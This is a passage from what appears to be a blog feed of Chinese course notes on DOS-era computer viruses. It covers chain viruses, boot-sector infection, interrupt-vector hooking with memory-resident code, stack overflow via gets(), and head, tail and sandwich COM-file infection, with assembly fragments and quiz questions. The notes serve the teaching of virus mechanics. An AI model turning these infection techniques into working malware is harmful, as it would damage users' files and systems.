<p>在cmd中编译以下代码，编译命令<code>gcc a.c -o b.exe</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> gi;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usage</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;please input s to set gi or d to dispaly gi\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argCount, <span class="keyword">char</span> ** args)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argCount != <span class="number">2</span>)  &#123;</span><br><span class="line">        usage();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (args[<span class="number">1</span>][<span class="number">0</span>] == <span class="string">&#x27;s&#x27;</span>)  &#123;</span><br><span class="line">        gi = <span class="number">12</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;gi = %d\n&quot;</span>, gi);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&amp;gi = %d\n&quot;</span>,&amp;gi);</span><br><span class="line">        getchar();    <span class="comment">//进程持续挂起</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (args[<span class="number">1</span>][<span class="number">0</span>] == <span class="string">&#x27;d&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;gi = %d\n&quot;</span>, gi);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&amp;gi = %d\n&quot;</span>,&amp;gi);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> usage();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后运行，会发现两个进程的值不同，但地址空间却相同！</p>
<p><img src="/images/%E7%97%85%E6%AF%92-Win-%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80/image-20210512200247086.png" alt="image-20210512200247086" /></p>
<p>这说明，我们看到的是“虚假”的内存地址</p>
<h3 id="原因分析"><a class="markdownIt-Anchor" href="#原因分析"></a> 原因分析</h3>
<p>在Windows系统下，处于保护模式，我们看见的内存地址是<strong>逻辑地址</strong>，并非真正的<strong>物理地址</strong></p>
<p>在DOS系统下，处于实模式，我们看见的内存地址就是真实的物理地址</p>
<p>同一逻辑地址的值对应不同物理上内存地址正是保护模式的能力</p>
<p><img src="/images/%E7%97%85%E6%AF%92-Win-%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80/image-20210512200650502.png" alt="image-20210512200650502" /></p>
<p><img src="/images/%E7%97%85%E6%AF%92-Win-%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80/image-20210512200751672.png" alt="image-20210512200751672" /></p>
<h3 id="转换过程"><a class="markdownIt-Anchor" href="#转换过程"></a> 转换过程</h3>
<p>32位虚拟地址分成3部分</p>
<ol>
<li>CR3寄存器给出页目录地址</li>
<li>前面10位用于在页目录中查找页表地址</li>
<li>中间10位用于在页表中查找页表项</li>
<li>后面12位给出相对页表项地址的偏移</li>
</ol>
<p><img src="/images/%E7%97%85%E6%AF%92-Win-%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80/image-20210512201221862.png" alt="image-20210512201221862" /></p>
]]></content>
      <categories>
        <category>病毒</category>
      </categories>
      <tags>
        <tag>课程</tag>
        <tag>计算机</tag>
        <tag>病毒</tag>
      </tags>
  </entry>
  <entry>
    <title>病毒_DOS_链式病毒</title>
    <url>/archives/b1495143.html</url>
    <content><![CDATA[<h2 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h2>
<p>之前的病毒在每份感染文件中都复制了一份病毒拷贝，而链式病毒只保留一份病毒拷贝，其利用文件目录项，将受感染文件的头簇指向病毒</p>
<span id="more"></span>
<h2 id="复习"><a class="markdownIt-Anchor" href="#复习"></a> 复习</h2>
<p>回顾一下文件的查找过程</p>
<p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E9%93%BE%E5%BC%8F%E7%97%85%E6%AF%92/image-20210512095523949.png" alt="image-20210512095523949" /></p>
<h2 id="工作原理"><a class="markdownIt-Anchor" href="#工作原理"></a> 工作原理</h2>
<p>感染过程：</p>
<ol>
<li>如首次感染，将病毒保存在某个空闲扇区</li>
<li>将被感染文件（com文件）首簇存目录项保留段</li>
<li>修改首簇指向病毒的首簇</li>
</ol>
<p>执行过程：</p>
<ol>
<li>执行被感染文件则启动病毒，加载的是病毒的首簇，并执行</li>
<li>病毒获取当前执行程序的名字，获取对应目录项。从其中保留字段获取原文件首簇号，并遍历FAT簇链加载它们</li>
<li>跳到原文件加载的内存中执行</li>
</ol>
<h2 id="病毒设计"><a class="markdownIt-Anchor" href="#病毒设计"></a> 病毒设计</h2>
<h3 id="感染部分"><a class="markdownIt-Anchor" href="#感染部分"></a> 感染部分</h3>
<ol>
<li>被感染文件的真实起始扇区号写到<strong>目录表项的保留区</strong>（目录项的保留区从目录项头第13个字节即偏移0ch开始，共10字节）</li>
<li>修改被感染文件的目录项的起始扇区字段指向病毒文件的首簇</li>
<li>目录项中的文件大小字段也要修改成病毒的真实大小，这样才能保证病毒能被完整加载</li>
<li>将原来病毒文件的目录项全部32字节改为0，这样从外部看就不存在这个病毒文件，也没有对应的目录项了</li>
</ol>
<h3 id="执行部分"><a class="markdownIt-Anchor" href="#执行部分"></a> 执行部分</h3>
<ol>
<li>先获取被感染程序的名字</li>
<li>然后从根目录寻找被感染程序的目录项</li>
<li>找到后从该文件目录项的保留区获取被感染程序的首簇号</li>
<li>找到被感染程序所在簇（即扇区），加载该扇区到内存</li>
</ol>
<p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E9%93%BE%E5%BC%8F%E7%97%85%E6%AF%92/image-20210512144855424.png" alt="image-20210512144855424" /></p>
<h2 id="重点"><a class="markdownIt-Anchor" href="#重点"></a> 重点</h2>
<h3 id="获取执行文件名"><a class="markdownIt-Anchor" href="#获取执行文件名"></a> 获取执行文件名</h3>
<ol>
<li>从com文件的ds：2c处获得环境块首址的段地址</li>
<li>环境块就在段地址：0000处</li>
<li>环境块内容PATH=……COMSPEC=C:\<a href="http://COMMAND.COM">COMMAND.COM</a>\0…0 0 xxxx</li>
<li>环境块开始是PATH等0字符结尾的串，最后是两个00字符。然后有两个字节可能是数目，之后就是执行程序的名字</li>
</ol>
]]></content>
      <categories>
        <category>病毒</category>
      </categories>
      <tags>
        <tag>课程</tag>
        <tag>计算机</tag>
        <tag>病毒</tag>
      </tags>
  </entry>
  <entry>
    <title>病毒_DOS_引导与中断</title>
    <url>/archives/11d03106.html</url>
    <content><![CDATA[<h2 id="面向文件系统的病毒引导型病毒"><a class="markdownIt-Anchor" href="#面向文件系统的病毒引导型病毒"></a> 面向文件系统的病毒——引导型病毒</h2>
<h3 id="大致思路"><a class="markdownIt-Anchor" href="#大致思路"></a> 大致思路</h3>
<p>将病毒放在软盘的引导扇区，并将原来的引导代码放到数据区，在执行完病毒代码后拷贝回原来的引导代码，并将执行权交给引导代码</p>
<span id="more"></span>
<h3 id="问题"><a class="markdownIt-Anchor" href="#问题"></a> 问题</h3>
<ol>
<li>自我覆盖的问题，所以需要我们将病毒中执行拷贝指令的代码移出被覆盖区域</li>
<li>如何使别的数据不使用簇2的问题，这里我们可以修改FAT1和FAT2表，将簇2改为不可用，如果改为已占用的FFF，由于没有对应目录项会很可疑，所以改为坏簇FF7</li>
</ol>
<h3 id="磁盘访问int-13h中断"><a class="markdownIt-Anchor" href="#磁盘访问int-13h中断"></a> 磁盘访问int 13h中断</h3>
<p>复位磁盘系统</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Xor ah, ah		;ah&#x3D;0为磁盘复位</span><br><span class="line">int 13h			;13h为磁盘中断</span><br></pre></td></tr></table></figure>
<p>读指定从磁头，道，扇区起始，n个扇区道内存缓冲</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AH &#x3D; 02h是读扇区功能号</span><br><span class="line">AL &#x3D; 将读入多少个扇区</span><br><span class="line">CL &#x3D; 起始扇区号</span><br><span class="line">CH &#x3D; 磁道</span><br><span class="line">DH &#x3D; 磁头</span><br><span class="line">DL &#x3D; 磁盘，0代表a盘</span><br><span class="line">ES:BX &#x3D; 读缓冲的地址，一般只填写BX</span><br><span class="line"></span><br><span class="line">Mov ah, 02</span><br><span class="line">Mov al, 5		;读5个扇区</span><br><span class="line">Mov cl, 1		;从1扇区开始</span><br><span class="line">Mov ch, 0	;读0道</span><br><span class="line">Mov dh，0	;读0头</span><br><span class="line">Mov dl, 0		;读a盘</span><br><span class="line">Mov bx,7c00h	;读到7c00h处</span><br><span class="line">int 13h</span><br></pre></td></tr></table></figure>
<p>设计一个基于0开始的绝对扇区读函数</p>
<p>功能：将绝对扇区号转化为磁头，道，扇区的CHS寻址方式</p>
<p>如何转化？</p>
<p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%BC%95%E5%AF%BC%E4%B8%8E%E4%B8%AD%E6%96%AD/image-20210512090322696.png" alt="image-20210512090322696" /></p>
<p>具体实现：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ReadSector:		;该函数的绝对扇区号是从0开始的</span><br><span class="line">			;函数参数：ax开始绝对扇区号, cl读扇区数, bx读缓冲地址</span><br><span class="line">mov bp, sp</span><br><span class="line">sub sp, 2			</span><br><span class="line">push bx		             	;保持读缓冲地址	</span><br><span class="line">mov byte [bp - 2], cl	;保持读扇区数</span><br><span class="line">mov bl, 18		;除数18</span><br><span class="line">div bl           		;被除数ax是绝对扇区号，除以18，余数在ah中，商在al中</span><br><span class="line">inc ah	     		;余数加1为道内扇区号</span><br><span class="line">mov cl, ah    		;int 13h中断参数设置cl&#x3D;道内扇区号</span><br><span class="line">mov dh, al    		;dh &#x3D; N</span><br><span class="line">and dh, 1      		;N&amp;1为磁头，int 13h中断参数设置dh&#x3D;磁头号  </span><br><span class="line">shr al, 1	     		;N 右移1位，al &#x3D; 磁道号</span><br><span class="line">mov ch, al    		;ch&#x3D;磁道号，int 13h中断参数设置ch&#x3D;道号</span><br><span class="line">mov dl, 0    		;int 13参数设置，dl&#x3D;0，读软盘</span><br><span class="line">pop bx		      	;获得读缓冲地址，设置int 13h参数，bx&#x3D;读缓冲地址</span><br><span class="line">mov ah, 02h           	;int 13h参数设置，读扇区功能号</span><br><span class="line">mov al, [bp - 2]      	;获得读扇区数，int 13h参数设置，al&#x3D;读取扇区数</span><br><span class="line">int 13h	</span><br><span class="line">add sp, 2</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<h3 id="执行部分程序设计"><a class="markdownIt-Anchor" href="#执行部分程序设计"></a> 执行部分程序设计</h3>
<p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%BC%95%E5%AF%BC%E4%B8%8E%E4%B8%AD%E6%96%AD/image-20210512090455764.png" alt="image-20210512090455764" /></p>
<h3 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h3>
<ol>
<li>关于软盘引导型病毒，下列说法不正确的是（       ）<br />
A. 病毒感染时会将原引导扇区内容拷贝到软盘的数据区<br />
B. 病毒执行时会将原引导扇区内容从软盘的数据区拷贝到内存7C00处<br />
C. 病毒将原引导扇区的内容拷贝到7C00时需要处理自我覆盖的问题<br />
D. 病毒感染时必须覆盖原引导扇区的全部内容才能获得执行</li>
</ol>
<p>参考答案：D</p>
<ol start="2">
<li>已知软盘上一个扇区的绝对扇区数是X，软盘1道有18个扇区，请问如何获得该扇区的CHS参数？</li>
</ol>
<p>参考答案：<img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%BC%95%E5%AF%BC%E4%B8%8E%E4%B8%AD%E6%96%AD/image-20210512091137459.png" alt="image-20210512091137459" /></p>
<h2 id="病毒的执行机制中断替换"><a class="markdownIt-Anchor" href="#病毒的执行机制中断替换"></a> 病毒的执行机制——中断替换</h2>
<h3 id="框架"><a class="markdownIt-Anchor" href="#框架"></a> 框架</h3>
<ol>
<li>认识中断向量表</li>
<li>非驻留式的中断向量修改</li>
<li>驻留式的中断向量修改</li>
</ol>
<h3 id="中断向量表"><a class="markdownIt-Anchor" href="#中断向量表"></a> 中断向量表</h3>
<p>触发中断后，就会去调用中断处理程序</p>
<p>而找到中断处理程序的入口地址就是通过中断向量表</p>
<p>中断向量表在内存00：00处，每4个字节为一个项，这个项的索引就是中断向量号，其中高2个字节为段地址，低2个字节为段内偏移</p>
<p>中断触发指令<code>int xxh</code>，xx就是中断向量号，4*xx就是中断xx的入口地址在中断向量表中的存放位置</p>
<h3 id="非驻留式中断向量修改"><a class="markdownIt-Anchor" href="#非驻留式中断向量修改"></a> 非驻留式中断向量修改</h3>
<p>驻留程序：一直在内存中不退出的程序，例如中断处理程序</p>
<p>我们目的是修改中断处理程序下的入口地址（即修改中断向量表）使其执行病毒程序，但是病毒程序也需要驻留在内存才不会使中断向量表无效</p>
<p>在非驻留式中断替换中我们在病毒程序调用后恢复中断向量表</p>
<h4 id="大致思路-2"><a class="markdownIt-Anchor" href="#大致思路-2"></a> 大致思路</h4>
<p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%BC%95%E5%AF%BC%E4%B8%8E%E4%B8%AD%E6%96%AD/image-20210512092456791.png" alt="image-20210512092456791" /></p>
<h4 id="重点"><a class="markdownIt-Anchor" href="#重点"></a> 重点</h4>
<p>病毒和中断向量表不在同一个段，因此段寄存器需要根据实际访问情况变化</p>
<p>跨段跳转的问题：</p>
<blockquote>
<p>病毒需要由自己段跳到原中断向量程序所在的段<br />
要跨段跳转，就要采用JMP XX:YY的形式<br />
但是JMP CX:AX的语法是不支持的<br />
即JMP XX:YY的指令不支持两个间接性，XXYY总有一个是立即数，而程序里面Seg和Offset都不是立即数，怎么解决？<br />
我们可以先采用两个立即数来确定JMP指令的形式（比如JMP 00:00），然后我们再来定位到JMP指令的机器码，进行按字节的细粒度修改！</p>
</blockquote>
<h4 id="程序设计"><a class="markdownIt-Anchor" href="#程序设计"></a> 程序设计</h4>
<p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%BC%95%E5%AF%BC%E4%B8%8E%E4%B8%AD%E6%96%AD/image-20210512093103505.png" alt="image-20210512093103505" /></p>
<h3 id="驻留式中断向量更改"><a class="markdownIt-Anchor" href="#驻留式中断向量更改"></a> 驻留式中断向量更改</h3>
<p>DOS系统自己就提供了中断调用修改中断向量表，因此这里把hook变成内存驻留</p>
<p>获取中断入口地址的调用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov al,16h	;al 中断向量号，16h为键盘IO中断号</span><br><span class="line">mov ah,35h	;功能号，取中断向量地址</span><br><span class="line">int 21h		;es:bx为中断程序入口地址</span><br></pre></td></tr></table></figure>
<p>设定中断向量的调用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov dx, offset		;ds:dx指出了新的中断入口地址</span><br><span class="line">mov al,16h		;这个指出了要设定的中断号</span><br><span class="line">mov ah,25h		;功能号，设置中断向量</span><br><span class="line">int 21h</span><br></pre></td></tr></table></figure>
<p>病毒代码程序设计</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">org	0100h</span><br><span class="line">jmp initialize</span><br><span class="line">Hook 驻留代码</span><br><span class="line">----------------</span><br><span class="line">initialize:</span><br><span class="line">;改变原中断的中断向量表项指向Hook</span><br><span class="line">;修改Hook最后一条JMP语句的机器码指向原中断向量程序地址</span><br><span class="line"></span><br><span class="line">mov dx, initialize    ;dx以前内容内存驻留</span><br><span class="line">int 27h		    ;返回DOS，结束进程，但不释放驻留内存</span><br></pre></td></tr></table></figure>
<h3 id="例题-2"><a class="markdownIt-Anchor" href="#例题-2"></a> 例题</h3>
<ol>
<li>关于DOS中断和中断型病毒，下列说法不正确的是（       ）<br />
A. DOS中断程序的入口地址存放在中断向量表中<br />
B. 病毒在修改中断向量表时需要考虑不同段地址的问题<br />
C. 10h中断程序的入口段地址存放在 4*10h+2的地方<br />
D. 中断型病毒是通过替换原中断处理程序获得执行机会</li>
</ol>
<p>参考答案：D</p>
<p>解析：并不是替换了原中断处理程序，而是修改了中断向量表使其先执行的病毒程序再执行中断处理程序</p>
]]></content>
      <categories>
        <category>病毒</category>
      </categories>
      <tags>
        <tag>课程</tag>
        <tag>计算机</tag>
        <tag>病毒</tag>
      </tags>
  </entry>
  <entry>
    <title>病毒_DOS_函数调用</title>
    <url>/archives/9c64c22b.html</url>
    <content><![CDATA[<h2 id="栈"><a class="markdownIt-Anchor" href="#栈"></a> 栈</h2>
<p>定义：是一种用来存储函数调用时的临时信息的结构，如函数调用所传递的参数、函数的返回地址、函数的局部变量等</p>
<p>特性：先进后出（FILO）</p>
<p>基本操作：</p>
<ol>
<li>PUSH：压栈</li>
<li>POP：弹栈</li>
</ol>
<span id="more"></span>
<h2 id="函数调用对栈的操作"><a class="markdownIt-Anchor" href="#函数调用对栈的操作"></a> 函数调用对栈的操作</h2>
<ol>
<li>把指令寄存器EIP（指向当前CPU将要运行的下一条指令的地址）入栈，作为程序的返回地址（一般用RET）表示</li>
<li>把基址寄存器EBP入栈（保护数据）</li>
<li>把EBP设为栈顶指针ESP，作为新的基地址</li>
<li>动态存储分配留出一定空间，即把ESP减去一个适当的值</li>
</ol>
<h3 id="获取参数值"><a class="markdownIt-Anchor" href="#获取参数值"></a> 获取参数值</h3>
<p>call指令执行完毕的栈布局：</p>
<p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20210511195956130.png" alt="image-20210511195956130" /></p>
<p>为了得到参数2，我们使用EBP保存ESP，而为了保护保存ESP的EBP，我们将其入栈，得到如此结构：</p>
<p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20210511200219660.png" alt="image-20210511200219660" /></p>
<h3 id="获取局部变量值"><a class="markdownIt-Anchor" href="#获取局部变量值"></a> 获取局部变量值</h3>
<p>栈分布如图：</p>
<p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20210511200418376.png" alt="image-20210511200418376" /></p>
<h3 id="获取返回值"><a class="markdownIt-Anchor" href="#获取返回值"></a> 获取返回值</h3>
<p>函数返回值通过eax寄存器传递，如果两个返回值还会使用edx：</p>
<p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20210511200752137.png" alt="image-20210511200752137" /></p>
<p>如果返回值太大、就需要主调函数在call被调函数之前创建临时空间：</p>
<p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20210511201041931.png" alt="image-20210511201041931" /></p>
<p>然后，在被调函数传递返回值时：</p>
<ol>
<li>通过[EBP+偏移]获得返回值的存放地址</li>
<li>把返回值写入到这个内存</li>
<li>把返回值写入到EAX，<code>mov eax,[ebp+偏移]</code></li>
</ol>
<p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20210511201411512.png" alt="image-20210511201411512" /></p>
<h2 id="函数调用的扫尾工作"><a class="markdownIt-Anchor" href="#函数调用的扫尾工作"></a> 函数调用的扫尾工作</h2>
<ol>
<li>平衡栈，清除参数传递消耗的栈空间</li>
<li>只需要改变esp值就可</li>
<li>可以由调用函数使用<code>ret 参数占用栈大小</code>来清除</li>
</ol>
<h2 id="栈溢出"><a class="markdownIt-Anchor" href="#栈溢出"></a> 栈溢出</h2>
<p>例如程序：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    gets(name);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">16</span>&amp;&amp;name[i];i++)</span><br><span class="line">        <span class="built_in">printf</span>(“%c”,name[i]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>当我们输入的数据大于16个字节时就会产生栈溢出，此时输入的字节会覆盖栈底内容导致出错，这就是栈溢出</p>
<p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20210511202236918.png" alt="image-20210511202236918" /></p>
<h2 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h2>
<ol>
<li>关于函数，下列说法不正确的是（       ）<br />
A. 被调函数通过EBP+偏移访问主调函数传递的参数<br />
B. 被调函数返回后，主调函数不需要再进行清栈的动作<br />
C. 被调函数通过寄存器将返回值或返回值地址传递给主调函数<br />
D. 被调函数通过EBP-偏移访问自己的局部变量</li>
</ol>
<p>参考答案：B</p>
<p>解析：主调函数是否进行清栈是根据被调函数是否清栈来的，而不是一定不清栈</p>
]]></content>
      <categories>
        <category>病毒</category>
      </categories>
      <tags>
        <tag>课程</tag>
        <tag>病毒</tag>
      </tags>
  </entry>
  <entry>
    <title>病毒_DOS_病毒寄生</title>
    <url>/archives/92e6b388.html</url>
    <content><![CDATA[<h2 id="框架"><a class="markdownIt-Anchor" href="#框架"></a> 框架</h2>
<p>寄生机制</p>
<blockquote>
<p>文件型病毒</p>
<blockquote>
<p>头插入、尾插入、逆插入</p>
</blockquote>
<p>面向文件系统的病毒</p>
<blockquote>
<p>引导性病毒</p>
</blockquote>
</blockquote>
<span id="more"></span>
<p>执行机制</p>
<blockquote>
<p>对于com文件，头，尾，逆插入寄生都相当于入口点修改，可以执行</p>
<p>中断替换</p>
</blockquote>
<h2 id="debug使用"><a class="markdownIt-Anchor" href="#debug使用"></a> debug使用</h2>
<ol>
<li>-u 反汇编</li>
<li>-g xxx 运行到xxx中断</li>
<li>-t 单步</li>
<li>-r 查看寄存器</li>
<li>-d 查看内存</li>
<li>-e 地址 值 修改内存</li>
<li>-a 地址 添加指令</li>
</ol>
<h2 id="病毒的寄生机制"><a class="markdownIt-Anchor" href="#病毒的寄生机制"></a> 病毒的寄生机制</h2>
<h3 id="头插入"><a class="markdownIt-Anchor" href="#头插入"></a> 头插入</h3>
<h4 id="dos环境下四种基本可执行文件格式"><a class="markdownIt-Anchor" href="#dos环境下四种基本可执行文件格式"></a> DOS环境下四种基本可执行文件格式</h4>
<ol>
<li>
<p>批处理文件 .bat结尾</p>
</li>
<li>
<p>设备驱动文件 .sys结尾</p>
</li>
<li>
<p>纯代码文件 .com结尾</p>
<blockquote>
<p>没有文件头</p>
<p>缺省从0x100H处开始执行</p>
<p>没有重定位项</p>
<p>所有代码和数据控制在64k以内</p>
</blockquote>
</li>
<li>
<p>EXE文件 .exe结尾</p>
<blockquote>
<p>文件以英文字母MZ开头</p>
<p>有一个文件头，指出每个段定义等信息</p>
<p>摆脱了代码大小不得超过64k的限制</p>
</blockquote>
</li>
</ol>
<h4 id="大致思路"><a class="markdownIt-Anchor" href="#大致思路"></a> 大致思路</h4>
<p>将病毒代码放到正常代码头部合成新的文件</p>
<h4 id="一些问题"><a class="markdownIt-Anchor" href="#一些问题"></a> 一些问题</h4>
<ol>
<li>病毒代码的ret导致直接退出，删掉ret</li>
<li>删掉ret后执行错误，发现是由于将数据区当指令执行了，利用JMP指令跳过数据区</li>
<li>正常执行后发现正常代码打印的字符串不对，发现是由于加载偏差，于是在病毒区后面增加代码使其复制正常代码到原来的位置进行覆盖，然后跳转到开始</li>
<li>在覆盖字符不多的情况下可以正常执行，换作大程序发现程序直接挂掉，发现是由于覆盖的代码将进行覆盖的指令都给覆盖了，于是我们需要保护拷贝指令，将拷贝指令复制到最后面，执行完成后跳转到开始</li>
</ol>
<h4 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h4>
<ol>
<li>多次利用JMP指令控制指令的执行</li>
<li>处理预期加载地址与实际加载地址不同的问题，处理覆盖的问题</li>
<li>利用代码拷贝来创造寄生空间或还原现场</li>
</ol>
<h3 id="尾插入"><a class="markdownIt-Anchor" href="#尾插入"></a> 尾插入</h3>
<h4 id="大致思路-2"><a class="markdownIt-Anchor" href="#大致思路-2"></a> 大致思路</h4>
<p>用JMP指令覆盖正常程序的前3个字节使其跳转到病毒代码，再将覆盖的代码写到病毒代码的最后，执行完病毒代码后将尾部保存的原字节内容覆盖回去再跳转回去执行就可</p>
<p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210509192438009.png" alt="image-20210509192438009" /></p>
<h4 id="自定位代码"><a class="markdownIt-Anchor" href="#自定位代码"></a> 自定位代码</h4>
<p>但是有一些问题，比如病毒代码的加载偏差，在头插入中我们采用将正常代码拷贝到原来位置来消除加载偏差的，可是如果我们拷贝病毒代码，那就成了头插入了，于是我们要想办法获得加载偏差的值然后在病毒代码中校正，这就是自定位技术（重定位技术）</p>
<ol>
<li>
<p>首先我们想到利用MOV AX，IP来获取IP寄存器的值，可是没有指令有权限访问IP寄存器</p>
</li>
<li>
<p>但是CALL指令很特殊，它会将<strong>下一条</strong>指令的IP压栈后跳转执行，于是我们可以利用这个机制获得加载偏差</p>
<p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210509194514539.png" alt="image-20210509194514539" /></p>
</li>
</ol>
<h4 id="总结-2"><a class="markdownIt-Anchor" href="#总结-2"></a> 总结</h4>
<p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210509200017110.png" alt="image-20210509200017110" /></p>
<h3 id="逆差入"><a class="markdownIt-Anchor" href="#逆差入"></a> 逆差入</h3>
<p>定义：逆插入感染，实际就是一部分代码在原程序的头部，一部分在尾部，将整个原来的程序给包裹起来</p>
<h4 id="图示"><a class="markdownIt-Anchor" href="#图示"></a> 图示</h4>
<p>大致思路：</p>
<p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210510151224438.png" alt="image-20210510151224438" /></p>
<p>程序设计：</p>
<p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210510152355492.png" alt="image-20210510152355492" /></p>
<p>感染代码：</p>
<p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210510152516043.png" alt="image-20210510152516043" /></p>
<h4 id="操作"><a class="markdownIt-Anchor" href="#操作"></a> 操作</h4>
<ol>
<li>逆差入需要拷贝多次（normal后移、头粘贴、尾粘贴）</li>
<li>用到了DOS读写文件的中断调用</li>
</ol>
<h4 id="dos下的文件读写"><a class="markdownIt-Anchor" href="#dos下的文件读写"></a> DOS下的文件读写</h4>
<p>类似C语言的fopen、fread、fwrite、fseek、fclose</p>
<p>打开文件：</p>
<p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210510151650600.png" alt="image-20210510151650600" /></p>
<p>读文件：</p>
<p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210510151716651.png" alt="image-20210510151716651" /></p>
<p>关闭文件：</p>
<p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210510151738657.png" alt="image-20210510151738657" /></p>
<p>写文件：</p>
<p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210510151754026.png" alt="image-20210510151754026" /></p>
<p>移动文件指针：</p>
<p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210510151818941.png" alt="image-20210510151818941" /></p>
<blockquote>
<p>以上代码将文件指针放在尾部，设置移动的偏移量CX：DX为0，就是不移动，那么调用21h后，得到的新偏移量就是文件大小，也就是AX中存放文件大小</p>
</blockquote>
<h4 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h4>
<p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210510152817598.png" alt="image-20210510152817598" /></p>
<blockquote>
<p>应该是从尾至头拷贝，防止覆盖</p>
</blockquote>
]]></content>
      <categories>
        <category>病毒</category>
      </categories>
      <tags>
        <tag>课程</tag>
        <tag>计算机</tag>
        <tag>病毒</tag>
      </tags>
  </entry>
  <entry>
    <title>病毒_基础_硬盘数据结构</title>
    <url>/archives/57883fea.html</url>
    <content><![CDATA[<h2 id="硬盘分区"><a class="markdownIt-Anchor" href="#硬盘分区"></a> 硬盘分区</h2>
<h3 id="作用"><a class="markdownIt-Anchor" href="#作用"></a> 作用</h3>
<p>建立硬盘数据结构（分区表、扩展分区等）</p>
<h3 id="执行"><a class="markdownIt-Anchor" href="#执行"></a> 执行</h3>
<p>分区划分以<strong>柱面</strong>为单位，一个柱面不能属于两个分区</p>
<span id="more"></span>
